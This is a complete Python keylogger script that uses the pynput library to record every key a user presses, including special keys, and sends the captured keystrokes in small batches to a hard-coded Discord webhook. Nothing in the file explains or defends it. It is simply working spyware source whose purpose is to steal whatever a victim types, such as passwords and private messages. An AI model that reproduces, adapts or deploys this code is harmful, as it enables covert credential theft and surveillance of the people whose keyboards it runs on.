from pynput import keyboard
import requests
import time

# Discord webhook URL (replace with your own webhook URL)
WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'

# Store the keystrokes
keystrokes = []

# Dictionary for special keys
special_keys = {
    keyboard.Key.space: "SPACE",
    keyboard.Key.enter: "ENTER",
    keyboard.Key.backspace: "BACKSPACE",
    keyboard.Key.tab: "TAB",
    keyboard.Key.shift: "SHIFT",
    keyboard.Key.ctrl_l: "CTRL",
    keyboard.Key.alt_l: "ALT",
    keyboard.Key.cmd: "CMD",
    keyboard.Key.esc: "ESC",
}

# Time-based delay for sending the keystrokes
last_sent_time = time.time()

# Function to send keystrokes to Discord
def send_to_webhook(message):
    """Send the message to the Discord webhook."""
    payload = {
        "content": message
    }
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Error sending message to webhook: {e}")

# Function to process key press events
def on_press(key):
    global keystrokes
    try:
        # For normal characters, we just append the character
        key_str = key.char
    except AttributeError:
        # For special keys, we use the dictionary to map to a human-readable name
        key_str = special_keys.get(key, str(key))  # Use the name from the dictionary if available

    # Append the key press to the keystrokes list
    keystrokes.append(key_str)

    # Check if we should send the keystrokes based on time or length
    global last_sent_time
    if len(keystrokes) >= 5 or time.time() - last_sent_time > 1:
        # Send the keystrokes to Discord
        send_to_webhook(''.join(keystrokes))
        keystrokes = []  # Reset the keystrokes list
        last_sent_time = time.time()  # Update the last sent time

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener when the Esc key is pressed
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
